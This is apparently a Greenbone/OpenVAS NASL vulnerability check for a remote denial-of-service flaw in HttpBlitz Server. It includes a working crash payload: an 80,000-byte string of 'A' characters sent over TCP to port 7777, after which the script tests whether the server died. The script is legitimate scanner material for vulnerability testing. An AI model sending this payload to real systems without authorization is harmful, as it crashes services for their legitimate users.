# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100949");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_require_ports("Services/www", 7777);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45573");

  script_tag(name:"summary", value:"HttpBlitz Server is prone to a remote denial-of-service vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to cause the application to crash,
  denying service to legitimate users.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:7777 );

banner = http_get_remote_headers( port:port );
if( ! banner || "Server:" >< banner ) exit( 0 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

if( ! soc = open_sock_tcp( port ) ) exit( 0 );

ex = crap( data:raw_string( 0x41 ), length:80000 );
send( socket:soc, data:string( ex, "\r\n" ) );

sleep( 2 );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
